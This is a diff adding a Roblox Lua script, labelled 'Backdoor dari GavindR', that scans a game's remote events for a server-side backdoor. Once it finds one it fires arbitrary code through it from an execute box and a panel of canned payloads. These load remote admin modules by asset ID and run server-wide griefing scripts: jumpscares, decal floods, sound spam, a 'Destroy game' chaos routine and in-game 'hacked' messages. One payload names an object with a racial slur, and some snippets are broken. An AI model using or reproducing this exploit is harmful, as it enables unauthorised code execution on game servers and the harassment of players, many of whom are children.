@@ -1,0 +1,1474 @@
+-- instance
+local b = Instance.new("ScreenGui")
+local MnPrt = Instance.new("Frame")
+local t = Instance.new("TextButton")
+local InPrt = Instance.new("Frame")
+local Cody = Instance.new("TextBox")
+local Execy = Instance.new("TextButton")
+local Acqur = Instance.new("TextButton")
+local CLR = Instance.new("TextButton")
+local r6 = Instance.new("TextButton")
+local re = Instance.new("TextButton")
+local g = Instance.new("TextButton")
+local Labely = Instance.new("TextLabel")
+
+b.Parent = game.CoreGui
+b.Name = 'HALO'
+b.ResetOnSpawn = true
+--.DisplayOrder = 100
+b.Name = math.random(1, 1000)
+
+MnPrt.Active = true
+MnPrt.BackgroundColor3 = Color3.new(0,0,0)
+MnPrt.BorderColor3 = Color3.new(1,0,0)
+MnPrt.Name = "??"
+MnPrt.Parent = b
+MnPrt.Position = UDim2.new(0.5, 0, 0.5,0)
+MnPrt.Size = UDim2.new(0,360,0,240)
+MnPrt.Draggable = true
+
+InPrt.Active = true
+InPrt.BackgroundColor3 = Color3.new(0,0,0)
+InPrt.BorderColor3 = Color3.new(1,0,0)
+InPrt.Name = "Inside"
+InPrt.Parent = MnPrt
+InPrt.Position = UDim2.new(0,0,0,50)
+InPrt.Size = UDim2.new(0,360,0,280)
+InPrt.Draggable = false
+
+t.Active = true
+t.Draggable = true
+t.BackgroundColor3 = Color3.new(0,0,0)
+t.BorderColor3 = Color3.new(1,0,0)
+t.Name = "??"
+t.Parent = b
+t.Position = UDim2.new(0.2,0,0,0)
+t.Size = UDim2.new(0,170,0,35)
+t.Font = Enum.Font.Legacy
+t.FontSize = Enum.FontSize.Size14
+t.Text = '[Open] gui'
+t.TextColor3 = Color3.new(1,0,0)
+t.MouseButton1Click:Connect(function()
+    MnPrt.Visible = not MnPrt.Visible
+    if MnPrt.Visible then
+        t.Text = '[Hide] GUI'
+    else
+        t.Text = '[Open] GUI'
+    end
+end)
+
+local corner = Instance.new("UICorner", MnPrt)
+corner.CornerRadius = UDim.new(0, 12)
+
+Cody.Active = true
+Cody.Visible = false
+Cody.BackgroundColor3 = Color3.new(0,0,0)
+Cody.BorderColor3 = Color3.new(1,0,0)
+Cody.ClearTextOnFocus = false
+Cody.ClipsDescendants = true
+Cody.MultiLine = true
+Cody.Name = 'KK'
+Cody.Parent = InPrt
+Cody.Position = UDim2.new(0,5,0,5)
+Cody.Size = UDim2.new(0,350,0,140)
+Cody.Font = Enum.Font.Legacy
+Cody.TextSize = 20
+Cody.Text = ""
+Cody.TextColor3 = Color3.new(1,1,1) 
+Cody.TextXAlignment = Enum.TextXAlignment.Left
+Cody.TextYAlignment = Enum.TextYAlignment.Top
+
+Cody.Focused:Connect(function()
+	Cody.TextSize = 25 
+end)
+Cody.FocusLost:Connect(function()
+	Cody.TextSize = 20
+end)
+
+Execy.Active = true
+Execy.Visible = false
+Execy.BackgroundColor3 = Color3.new(0,0,0)
+Execy.BorderColor3 = Color3.new(1,0,0)
+Execy.Name = "Execute"
+Execy.Parent = InPrt
+Execy.Position = UDim2.new(0,5,0,150)
+Execy.Size = UDim2.new(0,170,0,35)
+Execy.Font = Enum.Font.Legacy
+Execy.FontSize = Enum.FontSize.Size14
+Execy.Text = 'Execute'
+Execy.TextColor3 = Color3.new(1,0,0)
+
+Acqur.Active = true
+Acqur.BackgroundColor3 = Color3.new(0,0,0)
+Acqur.BorderColor3 = Color3.new(1,0,0)
+Acqur.Name = "Acquire"
+Acqur.Parent = InPrt
+Acqur.Position = UDim2.new(0, 38, 0, 63)
+Acqur.Size = UDim2.new(0,300,0,105)
+Acqur.Font = Enum.Font.Legacy
+Acqur.FontSize = Enum.FontSize.Size14
+Acqur.Text = 'Start Scaning!'
+Acqur.TextColor3 = Color3.new(1,0,0)
+
+CLR.Active = true
+CLR.Visible = false
+CLR.BackgroundColor3 = Color3.new(0,0,0)
+CLR.BorderColor3 = Color3.new(1,0,0)
+CLR.Name = "Claaf"
+CLR.Parent = InPrt
+CLR.Position = UDim2.new(0,185,0,150)
+CLR.Size = UDim2.new(0,170,0,35)
+CLR.Font = Enum.Font.Legacy
+CLR.FontSize = Enum.FontSize.Size14
+CLR.Text = 'Clear'
+CLR.TextColor3 = Color3.new(1,0,0)
+
+r6.Active = true
+r6.Visible = false
+r6.BackgroundColor3 = Color3.new(0,0,0)
+r6.BorderColor3 = Color3.new(1,0,0)
+r6.Name = "R6"
+r6.Parent = InPrt
+r6.Position = UDim2.new(0, 200, 0, 193)
+r6.Size = UDim2.new(0,63,0,35)
+r6.Font = Enum.Font.Legacy
+r6.FontSize = Enum.FontSize.Size14
+r6.Text = 'Hide[of]'
+r6.TextColor3 = Color3.new(1,0,0)
+
+re.Active = true
+re.Visible = false
+re.BackgroundColor3 = Color3.new(0,0,0)
+re.BorderColor3 = Color3.new(1,0,0)
+re.Name = "re"
+re.Parent = InPrt
+re.Position = UDim2.new(0, 290, 0, 193)
+re.Size = UDim2.new(0,55,0,35)
+re.Font = Enum.Font.Legacy
+re.FontSize = Enum.FontSize.Size14
+re.Text = 'Reset!'
+re.TextColor3 = Color3.new(1,0,0)
+
+g.Active = true
+g.Visible = false
+g.BackgroundColor3 = Color3.new(0,0,0)
+g.BorderColor3 = Color3.new(1,0,0)
+g.Name = "sosisj"
+g.Parent = InPrt
+g.Position = UDim2.new(0, 2, 0, 193) 
+g.Size = UDim2.new(0,185,0,35)
+g.Font = Enum.Font.Legacy
+g.FontSize = Enum.FontSize.Size14
+g.Text = 'buka panel'
+g.TextColor3 = Color3.new(1,0,0)
+
+Labely.Active = true
+Labely.BackgroundColor3 = Color3.new(0,0,0)
+Labely.BorderColor3 = Color3.new(0,0,0)
+Labely.Name = "Title"
+Labely.Parent = MnPrt
+Labely.Position = UDim2.new(0,180,0,25)
+Labely.Size = UDim2.new(0,0,0,0)
+Labely.Font = Enum.Font.Legacy
+Labely.FontSize = Enum.FontSize.Size14
+Labely.Text = 'Backdoor dari GavindR 👇 status:Start'
+Labely.TextColor3 = Color3.new(0,255,0)
+
+AcquiredRemote = nil
+isAcquiring = false
+local RS = game.RobloxReplicatedStorage
+local NameList = {
+	"GAVINDR W",
+	"GAVINDR o",
+	"GAVINDR W2"
+}
+
+local function RandomName()
+	return NameList[math.random(1, #NameList)]
+end
+
+Acqur.MouseButton1Click:Connect(function()
+	if isAcquiring then return end
+	isAcquiring = true
+
+	Acqur.Text = "Scanning..."
+	local RemoteList = {}
+	local FoundRemote = nil
+
+	Kokokkk = RandomName()
+	local hehe = 'l=Instance.new("StringValue",workspace) l.Name="'..Kokokkk..'"'
+
+	for _, v in ipairs(game:GetDescendants()) do
+		if v.Parent ~= RS then
+			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+				table.insert(RemoteList, v)
+			end
+		end
+	end
+
+	for _, r in ipairs(RemoteList) do
+		if FoundRemote then break end
+
+		if r:IsA("RemoteEvent") then
+			pcall(function()
+				r:FireServer(hehe)
+			end)
+		else
+			pcall(function()
+				r:InvokeServer(hehe)
+			end)
+		end
+
+		task.wait(0.1)
+
+		if workspace:FindFirstChild(Kokokkk) then
+			FoundRemote = r
+			break
+		end
+	end
+
+	if FoundRemote then
+		AcquiredRemote = FoundRemote
+
+		Execy.Visible = true
+		Cody.Visible = true
+		CLR.Visible = true
+		r6.Visible = true
+		re.Visible = true
+		g.Visible = true
+
+		Labely.Text = "Backdoor dari GavindR 👇 status:🟩"
+		Acqur:Destroy()
+	else
+		AcquiredRemote = nil
+		Labely.Text = "Backdoor dari GavindR 👇 status:🟥"
+		Acqur.Text = "No Backdoor"
+      
+	end
+
+	task.wait(1)
+   Acqur.Text = "Scan"
+	isAcquiring = false
+end)
+local CodeStr = Cody.Text
+
+local function ExecutePayload()
+	if not AcquiredRemote then
+		warn("BELUM ADA REMOTE")
+		return
+	end
+
+	local CodeStr = Cody.Text
+
+	if AcquiredRemote:IsA("RemoteEvent") then
+		AcquiredRemote:FireServer(CodeStr)
+	else
+		pcall(function()
+			AcquiredRemote:InvokeServer(CodeStr)
+		end)
+	end
+end
+
+Execy.MouseButton1Click:Connect(function()
+	Execy.Text = "Executed!"
+	ExecutePayload()
+	task.wait(1.5)
+	Execy.Text = "Execute!"
+end)
+
+CLR.MouseButton1Click:Connect(function()  
+Cody.Text = ''
+end)
+
+local toggled = false
+
+r6.MouseButton1Click:Connect(function()
+    if toggled then
+        Cody.BackgroundColor3 = Color3.new(0,0,0) -- hitam
+        r6.Text = 'Hide[of]'
+    else
+        Cody.BackgroundColor3 = Color3.new(1,1,1) -- merah
+        r6.Text = 'Hide[on]'
+    end
+    toggled = not toggled -- balik status toggle
+end)
+
+re.MouseButton1Click:Connect(function() 
+
+if player.Character and player.Character:FindFirstChild("Humanoid") then
+	player.Character.Humanoid.Health = 0
+end
+
+	
+end)
+
+local scrl = Instance.new("ScrollingFrame", InPrt)
+scrl.Position = UDim2.new(0, 206, 0, 36)
+scrl.Size = UDim2.new(0, 200, 0, 200)
+scrl.CanvasSize = UDim2.new(0,0,0,0)
+scrl.Visible = false
+scrl.BackgroundColor3 = Color3.fromRGB(0,0,0)
+scrl.BackgroundTransparency = 0
+scrl.ScrollBarThickness = 8
+
+local UIList = Instance.new("UIListLayout", scrl)
+UIList.SortOrder = Enum.SortOrder.LayoutOrder
+UIList.Padding = UDim.new(0,3)
+
+local function bf(text, callback)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 100, 0, 50)
+    button.Name = text
+    button.BackgroundColor3 = Color3.new(1, 1, 1) 
+    button.TextColor3 = Color3.fromRGB(250, 0, 0)
+    button.Parent = scrl
+    button.Text = text
+    button.TextScaled = true
+
+    local kk = Instance.new("UICorner", button) 
+    kk.CornerRadius = UDim.new(0, 8)
+
+    local grad = Instance.new("UIGradient", button)
+    grad.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
+    })
+
+    button.MouseButton1Click:Connect(callback)
+
+    -- 🔥 WAJIB DIPINDAH KE SINI (Sebelum return)
+    task.wait()
+    scrl.CanvasSize = UDim2.new(0, 0, 0, UIList.AbsoluteContentSize.Y)
+
+    return button
+end
+
+g.MouseButton1Click:Connect(function()
+    scrl.Visible = not scrl.Visible
+    if scrl.Visible then
+        g.Text = 'tutup panel'
+    else
+        g.Text = 'Buka panel'
+    end
+end)
+
+bf("c4nc4n", function()
+local codeText = 'require(111283583907072):C4NC4N( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf("happy hub", function()
+local codeText = 'require(110047253067635):Hload( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end) 
+
+bf("k00pkidd Gui", function()
+local codeText = 'require(15267263357).V11( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf("777 ililo", function()
+local codeText = 'require(134907549394378)( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf("primamdon", function()
+local codeText = 'require(17523790773)( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf("sensation hub", function()
+local codeText = 'require(100263845596551)( "' .. PLAYER_NAME .. '" , ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf("Nezor v1", function()
+local codeText = 'require(100227259985025):Ex( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf(' dng', function()
+local codeText = 'require(0x55EDFB9C27C1):G( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf('polaria', function()
+local codeText = 'require(123255432303221):Pload( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf('blue2spooky', function()
+local codeText = 'require(132099457182422):blue2spooky( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+ExecutePayload()
+end)
+
+bf('{GavindR .Hint', function()
+local h = [[
+h = Instance.new("Hint",workspace)
+h.Text = 'team GavindR Join taday Fuck the game'
+]]
+Cody.Text = h
+ExecutePayload()
+end)
+
+bf(' Message', function()
+local m = [[
+h = Instance.new("Message",workspace)
+h.Text = 'Team,GavindR join todayy Sssssss s'
+]]
+Cody.Text = m
+ExecutePayload()
+end)
+
+bf(' disco', function()
+local dis = [[
+local Lighting = game:GetService("Lighting")
+local ColorCorrection = Instance.new("ColorCorrectionEffect")
+ColorCorrection.Parent = Lighting
+
+local function zigzag(X)
+	return math.acos(math.cos(X * math.pi)) / math.pi
+end
+
+local Counter = 0
+Lighting.TimeOfDay = "12:00"
+
+while task.wait(0.02) do
+	local color = Color3.fromHSV(zigzag(Counter), 1, 1)
+	ColorCorrection.TintColor = color
+	Lighting.Ambient = color
+	Counter += 0.01
+end
+]]
+Cody.Text = dis
+ExecutePayload()
+end)
+
+bf('BURN ALL or 666', function()
+local m = [[
+for i,v in next,workspace:children''do
+			if(v:IsA'BasePart')then
+				me=v;
+				bbg=Instance.new('BillboardGui',me);
+				bbg.Name='stuf';
+				bbg.Adornee=me;
+				bbg.Size=UDim2.new(2.5,0,2.5,0)
+				--bbg.StudsOffset=Vector3.new(0,2,0)
+				tlb=Instance.new'TextLabel';
+				tlb.Text='666 666 666 666 666 666';
+				tlb.Font='SourceSansBold';
+				tlb.FontSize='Size48';
+				tlb.TextColor3=Color3.new(1,0,0);
+				tlb.Size=UDim2.new(1.25,0,1.25,0);
+				tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
+				tlb.BackgroundTransparency=1;
+				tlb.Parent=bbg;
+			end;end;
+		function xds(dd)
+			for i,v in next,dd:children''do
+				if(v:IsA'BasePart')then
+					v.BrickColor=BrickColor.new'Really black';
+					v.TopSurface='Smooth';
+					v.BottomSurface='Smooth';
+					s=Instance.new('SelectionBox',v);
+					s.Adornee=v;
+					s.Color=BrickColor.new'Really red';
+					a=Instance.new('PointLight',v);
+					a.Color=Color3.new(1,0,0);
+					a.Range=15;
+					a.Brightness=5;
+					f=Instance.new('Fire',v);
+					f.Size=19;
+					f.Heat=22;
+				end;
+	
+				local dec = 'http://www.roblox.com/asset/?id=19399245';
+				local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
+				--coroutine.wrap(function()
+				--for ,_ in pairs(fac) do
+				--local ddec = Instance.new("Decal", v)
+				--ddec.Face = 
+				--ddec.Texture = dec
+				--end end)()
+				if #(v:GetChildren())>0 then
+					xds(v) 
+				end
+			end
+		end
+		xds(game.Workspace)
+]]
+Cody.Text = m
+ExecutePayload()
+end)
+
+bf(' title', function()
+local tt = [[
+local Ply = ' "' .. PLAYER_NAME .. '" '
+local Players = game:GetService("Players").Ply
+local head = Players.character:WaitForChild("Head")
+local gui1 = Instance.new("BillboardGui")
+gui1.Name = "NameBillboard"
+gui1.Parent = head
+gui1.Adornee = head
+gui1.Size = UDim2.new(0, 150, 0, 50)
+gui1.StudsOffset = Vector3.new(0, 1.5, 0)
+gui1.AlwaysOnTop = true
+
+local tecks = Instance.new("TextLabel")
+tecks.Parent = gui1
+tecks.BackgroundTransparency = 1
+tecks.BorderSizePixel = 0
+tecks.Text = "G-a-v-i-n-d-R"
+tecks.Font = Enum.Font.Fantasy
+tecks.TextScaled = true
+tecks.TextStrokeTransparency = 0
+tecks.TextStrokeColor3 = Color3.new(0, 0, 0)
+tecks.TextColor3 = Color3.new(0.8, 0, 0)
+tecks.Size = UDim2.new(1, 0, 1, 0)
+]]
+Cody.Text = tt
+local now = Cody.Text
+ExecutePayload()
+end)
+
+bf('Skybox', function()
+local s = [[
+local skyId = "rbxassetid://77005694743685"
+
+local sky = Instance.new("Sky")
+sky.Parent = game:GetService("Lighting")
+sky.SkyboxBk = skyId
+sky.SkyboxDn = skyId
+sky.SkyboxFt = skyId
+sky.SkyboxLf = skyId
+sky.SkyboxRt = skyId
+sky.SkyboxUp = skyId
+
+local RunService = game:GetService("RunService")
+
+RunService.Heartbeat:Connect(function(dt)
+    local c = sky.SkyboxOrientation
+
+    sky.SkyboxOrientation = Vector3.new(
+        (c.X + 20 * dt) % 360,
+        (c.Y + 45 * dt) % 360,
+        (c.Z + 70 * dt) % 360
+    )
+end)
+]]
+Cody.Text = s
+ExecutePayload()
+end)
+
+bf('decal spam', function()
+local d = [[
+local de = "rbxassetid://77005694743685"
+function exPro(root)
+			for _, v in pairs(root:GetChildren()) do
+				if v:IsA("Decal") and v.Texture ~= de then
+					v.Parent = nil
+				elseif v:IsA("BasePart") then
+					v.Material = "Plastic"
+					v.Transparency = 0
+					local One = Instance.new("Decal", v)
+					local Two = Instance.new("Decal", v)
+					local Three = Instance.new("Decal", v)
+					local Four = Instance.new("Decal", v)
+					local Five = Instance.new("Decal", v)
+					local Six = Instance.new("Decal", v)
+					One.Texture = de
+					Two.Texture = de
+					Three.Texture = de
+					Four.Texture = de
+					Five.Texture = de
+					Six.Texture = de
+					One.Face = "Front"
+					Two.Face = "Back"
+					Three.Face = "Right"
+					Four.Face = "Left"
+					Five.Face = "Top"
+					Six.Face = "Bottom"
+				end
+				exPro(v)
+			end
+		end
+		function asdf(root)
+			for _, v in pairs(root:GetChildren()) do
+				asdf(v)
+			end
+		end
+		exPro(game.Workspace)
+		asdf(game.Workspace)
+]]
+Cody.Text = d
+ExecutePayload()
+end)
+
+bf('particles ', function() 
+local pb = [[
+local t1 = "rbxassetid://77005694743685"
+local t2 = "rbxassetid://113665607881195"
+local t3 = "rbxassetid://71586752776874"
+
+local particle = true
+
+if particle == true then
+
+    local function createRotatingParticle(parent, texture)
+        local pe = Instance.new("ParticleEmitter")
+        pe.Texture = texture
+        pe.Rate = 100
+        pe.Size = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 4),
+            NumberSequenceKeypoint.new(1, 0)
+        })
+        
+        pe.Lifetime = NumberRange.new(5, 10)
+        pe.Speed = NumberRange.new(50, 100)
+        pe.VelocitySpread = 360
+        pe.Rotation = NumberRange.new(0, 360)
+        pe.RotSpeed = NumberRange.new(90, 180)
+
+        pe.Parent = parent -- WAJIB parent ke Part
+    end
+
+    -- Ke semua Part langsung di workspace
+    for _, v in ipairs(workspace:GetChildren()) do
+        if v:IsA("Part") then
+            createRotatingParticle(v, t1)
+            createRotatingParticle(v, t2)
+            createRotatingParticle(v, t3)
+        end
+    end
+
+    -- Ke semua part dalam Model
+    for _, model in ipairs(workspace:GetChildren()) do
+        if model:IsA("Model") then
+            for _, part in ipairs(model:GetChildren()) do
+                if part:IsA("Part") then
+                    createRotatingParticle(part, t1)
+                    createRotatingParticle(part, t2)
+                    createRotatingParticle(part, t3)
+                end
+            end
+        end
+    end
+end
+]]
+Cody.Text = pb
+ExecutePayload()
+end)
+
+bf('jumpscare', function()
+local j = [[
+for _, v in pairs(game.Players:GetPlayers()) do
+	if v:FindFirstChild("PlayerGui") and not v.PlayerGui:FindFirstChild("Screamer") then
+		task.spawn(function()
+			local newgui = Instance.new("ScreenGui")
+			newgui.Name = "Screamer"
+			newgui.IgnoreGuiInset = true
+			newgui.ResetOnSpawn = false
+			newgui.DisplayOrder = 10000
+			newgui.Parent = v.PlayerGui
+
+			local newimage = Instance.new("ImageLabel")
+			newimage.Parent = newgui
+			newimage.Size = UDim2.new(1, 0, 1, 0)
+			newimage.Position = UDim2.new(0, 0, 0, 0)
+			newimage.BackgroundTransparency = 0
+			newimage.Image = "rbxassetid://113665607881195"
+
+			local s = Instance.new("Sound")
+			s.SoundId = "rbxassetid://9069609200"
+			s.Volume = 10
+			s.Looped = false
+			s.Parent = newgui
+         local fx = Instance.new("DistortionSoundEffect", s) 
+         fx.Level = 1
+			s:Play()
+
+			wait(9.5487)
+			newgui:Destroy()
+		end)
+	end
+end
+]]
+Cody.Text = j
+ExecutePayload()
+end)
+
+bf('Destroy game|Rusuh', function()
+local m = [[
+--// SERVICES
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris")
+local Teams = game:GetService("Teams")
+
+--------------------------------------------------
+--// ASSET IDS
+--------------------------------------------------
+local Frames = {
+	"rbxassetid://113665607881195",
+	"rbxassetid://87439537035781",
+	"rbxassetid://77005694743685"
+}
+
+local DecalTex = "rbxthumb://type=Asset&id=77005694743685&w=420&h=420"
+
+--------------------------------------------------
+--// SCREAMER FUNCTION
+--------------------------------------------------
+local function Screamer(player)
+	if not player:WaitForChild("PlayerGui", 5) then return end
+	if player.PlayerGui:FindFirstChild("Screamer") then return end
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "Screamer"
+	gui.IgnoreGuiInset = true
+	gui.ResetOnSpawn = false
+	gui.DisplayOrder = 25000
+	gui.Parent = player.PlayerGui
+
+	local img = Instance.new("ImageLabel")
+	img.Size = UDim2.fromScale(1,1)
+	img.BackgroundTransparency = 1
+	img.Parent = gui
+
+	local sound = Instance.new("Sound")
+	sound.SoundId = "rbxassetid://9069609200"
+	sound.Volume = 5
+	sound.Parent = gui
+
+	local fx = Instance.new("DistortionSoundEffect", sound)
+	fx.Level = 0.8
+
+	sound:Play()
+
+	task.spawn(function()
+		while gui.Parent do
+			for _,id in ipairs(Frames) do
+				img.Image = id
+				task.wait(0.06)
+			end
+		end
+	end)
+
+	task.delay(3, function()
+		gui:Destroy()
+	end)
+end
+
+--------------------------------------------------
+--// APPLY TO ALL PLAYERS
+--------------------------------------------------
+for _,plr in ipairs(Players:GetPlayers()) do
+	task.spawn(Screamer, plr)
+end
+
+Players.PlayerAdded:Connect(Screamer)
+
+--------------------------------------------------
+--// SKY GLITCH
+--------------------------------------------------
+local sky = Instance.new("Sky", Lighting)
+
+task.spawn(function()
+	while true do
+		for _,id in ipairs(Frames) do
+			sky.SkyboxBk = id
+			sky.SkyboxDn = id
+			sky.SkyboxFt = id
+			sky.SkyboxLf = id
+			sky.SkyboxRt = id
+			sky.SkyboxUp = id
+			task.wait(0.05)
+		end
+	end
+end)
+
+RunService.Heartbeat:Connect(function(dt)
+	sky.SkyboxOrientation += Vector3.new(20,45,70) * dt
+end)
+
+--------------------------------------------------
+--// PARTICLE GLITCH
+--------------------------------------------------
+local function createParticle(part, tex)
+	local p = Instance.new("ParticleEmitter")
+	p.Texture = tex
+	p.Rate = 80
+	p.Lifetime = NumberRange.new(3,6)
+	p.Speed = NumberRange.new(40,80)
+	p.Rotation = NumberRange.new(0,360)
+	p.RotSpeed = NumberRange.new(90,180)
+	p.Size = NumberSequence.new({
+		NumberSequenceKeypoint.new(0,3),
+		NumberSequenceKeypoint.new(1,0)
+	})
+	p.Transparency = NumberSequence.new({
+		NumberSequenceKeypoint.new(0,0),
+		NumberSequenceKeypoint.new(1,1)
+	})
+	p.Parent = part
+end
+
+for _,v in ipairs(workspace:GetDescendants()) do
+	if v:IsA("BasePart") and math.random(1,3) == 1 then
+		createParticle(v, Frames[math.random(#Frames)])
+	end
+end
+
+--------------------------------------------------
+--// DECAL FLOOD (SAFE)
+--------------------------------------------------
+local function flood(model)
+	for _,v in ipairs(model:GetChildren()) do
+		if v:IsA("BasePart") then
+			v.Material = Enum.Material.Plastic
+			for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
+				local d = Instance.new("Decal")
+				d.Texture = DecalTex
+				d.Face = face
+				d.Parent = v
+			end
+		elseif v:IsA("Model") or v:IsA("Folder") then
+			flood(v)
+		end
+	end
+end
+
+task.spawn(function()
+	flood(workspace)
+end)
+
+--------------------------------------------------
+--// HINT + BILLBOARD
+--------------------------------------------------
+local hint = Instance.new("Hint", workspace)
+hint.Text = "Get hacked by gavindR — backdoor accessed"
+
+local function Billboard(char)
+	local head = char:WaitForChild("Head",5)
+	if not head then return end
+
+	local gui = Instance.new("BillboardGui", head)
+	gui.Size = UDim2.new(3,0,3,0)
+	gui.StudsOffset = Vector3.new(0,0.5,0)
+	gui.AlwaysOnTop = true
+
+	local txt = Instance.new("TextLabel", gui)
+	txt.Size = UDim2.new(1,0,0.4,0)
+	txt.BackgroundTransparency = 1
+	txt.Text = "GAVINDR WAS HERE"
+	txt.Font = Enum.Font.Fantasy
+	txt.TextSize = 24
+	txt.TextStrokeTransparency = 0
+	txt.TextColor3 = Color3.fromRGB(200,0,0)
+
+	local img = Instance.new("ImageLabel", gui)
+	img.Image = DecalTex
+	img.BackgroundTransparency = 1
+	img.Size = UDim2.fromScale(1,1)
+end
+
+for _,plr in ipairs(Players:GetPlayers()) do
+	if plr.Character then
+		Billboard(plr.Character)
+	end
+	plr.CharacterAdded:Connect(Billboard)
+end
+
+--------------------------------------------------
+--// CHAOS SOUND LOOP (ANTI CRASH)
+--------------------------------------------------
+task.spawn(function()
+	while true do
+		local s = Instance.new("Sound", workspace)
+		s.SoundId = "rbxassetid://139488665764275"
+		s.Volume = 5
+		s.Pitch = math.random(1,3)
+		s:Play()
+		Debris:AddItem(s, 4)
+		task.wait(1)
+	end
+end)
+
+--------------------------------------------------
+--// TEAM CHAOS (SAFE)
+--------------------------------------------------
+if Teams then
+	task.spawn(function()
+		while true do
+			local t = Instance.new("Team", Teams)
+			t.Name = "hail gavindR_" .. math.random(1,9999)
+			t.TeamColor = BrickColor.Random()
+			task.wait(2)
+		end
+	end)
+end
+]]
+Cody.Text = m
+ExecutePayload()
+end)
+
+bf('face all', function() 
+local tt = [[
+for i,v in pairs(game.Players:GetChildren()) do
+			if v.Character:FindFirstChild("Head") then
+				gui1=Instance.new("BillboardGui")
+				gui1.Parent = v.Character.Head
+				gui1.Adornee = v.Character.Head
+				gui1.Size=UDim2.new(2.5,0,2.5,0)
+				gui1.StudsOffset=Vector3.new(0,0.2,0)
+				gui1.AlwaysOnTop = true
+				text1=Instance.new("ImageLabel")
+				text1.Image = "rbxassetid://77005694743685"
+				text1.Size=UDim2.new(1,0,1,0)
+				text1.Position=UDim2.new(0,0,0,0)
+				text1.BackgroundTransparency = 1
+				text1.Parent=gui1
+				v.Character.Head.Transparency = 1
+			end
+		end
+]]
+Cody.Text = tt
+ExecutePayload()
+end)
+
+bf('mu wont stop us', function() 
+local mw = [[
+local y = Instance.new("Sound")
+y.Name = "😭😭"
+y.SoundId = "rbxassetid://1847661821"
+y.Pitch = 1
+y.Looped = true
+y.Volume = 10
+y.Parent = workspace
+local fx = Instance.new("DistortionSoundEffect", y) 
+fx.Level = 0.5
+y:Play()
+]]
+Cody.Text = mw
+ExecutePayload()
+end)
+
+bf(' mu jumpstyle 0ld', function() 
+local m8 = [[
+local y = Instance.new("Sound")
+y.Name = "😭😭"
+y.SoundId = "rbxassetid://1839246711"
+y.Pitch = 1
+y.Looped = true
+y.Volume = 10
+y.Parent = workspace
+local fx = Instance.new("DistortionSoundEffect", y) 
+fx.Level = 0.3
+y:Play()
+]]
+Cody.Text = m8
+ExecutePayload()
+end)
+
+bf('horror ambient sound', function() 
+local m8 = [[
+local ss = Instance.new("Sound", workspace)
+ss.Name = "😭😭"
+ss.SoundId = "rbxassetid://9041745502"
+ss.Volume = 10
+ss.Looped = true
+local fx = Instance.new("DistortionSoundEffect", s) 
+fx.Level = 2
+ss:Play()
+]]
+Cody.Text = m8
+ExecutePayload()
+end)
+
+bf('jumpstyle', function() 
+local m8 = [[
+local y = Instance.new("Sound")
+y.Name = "😭😭"
+y.SoundId = "rbxassetid://76578817848504"
+y.Pitch = 1
+y.Looped = true
+y.Volume = 10
+y.Parent = workspace
+local fx = Instance.new("DistortionSoundEffect", s) 
+fx.Level = 1
+y:Play()
+]]
+Cody.Text = m8
+ExecutePayload()
+end)
+
+bf('delete music', function() 
+local td = [[
+for _, s in ipairs(workspace:GetDescendants()) do
+	if s:IsA("Sound") then
+		pcall(function()
+			if s and s.Parent then
+				s:Stop()
+				task.wait(0.01)
+				
+				-- Lepas dulu dari parent biar tidak error saat destroy
+				s.Parent = nil
+				task.wait(0.01)
+				
+				s:Destroy()
+			end
+		end)
+	end
+end
+]]
+Cody.Text = td
+ExecutePayload()
+end)
+
+bf('baseplate', function() 
+local fi = [[
+local Players = game:GetService("Players")
+
+--=== BUAT BASEPLATE BAGUS DI ATAS ===--
+local base = Instance.new("SpawnLocation")
+base.Name = "nigger66d"
+base.Size = Vector3.new(2090, 5, 2090)
+base.Position = Vector3.new(90, 450, 0)
+base.Anchored = true
+base.Color = Color3.fromRGB(106, 255, 75)
+base.Material = Enum.Material.Grass -- Material bagus
+base.TopSurface = Enum.SurfaceType.Smooth
+base.Parent = workspace
+
+--=== FUNGSI TELEPORT ===--
+local function teleportPlayer(plr)
+	if plr.Character then
+		local hrp = plr.Character:WaitForChild("HumanoidRootPart", 2)
+		if hrp then
+			hrp.CFrame = CFrame.new(base.Position + Vector3.new(0, 6, 0))
+		end
+	end
+end
+
+--=== SETUP UNTUK SEMUA PLAYER YANG SUDAH ADA ===--
+for _, plr in ipairs(Players:GetPlayers()) do
+	setupDeathTeleport(plr)
+	teleportPlayer(plr)
+end
+
+--=== SETUP UNTUK PLAYER BARU ===--
+Players.PlayerAdded:Connect(function(plr)
+	setupDeathTeleport(plr)
+end)
+]]
+Cody.Text = fi
+ExecutePayload()
+end)
+
+bf('part raining', function() 
+prg = [[
+local RunService = game:GetService("RunService")
+local Materials = Enum.Material:GetEnumItems()
+local Shapes = {
+	Enum.PartType.Block,
+	Enum.PartType.Ball,
+	Enum.PartType.Cylinder
+}
+
+-- Area hujan
+local Xrange = math.random(-255,9999)   -- lebar hujan
+local Zrange = math.random(-255,9999)   -- panjang hujan
+local height = math.random(-255,9999)   -- tinggi spawn part
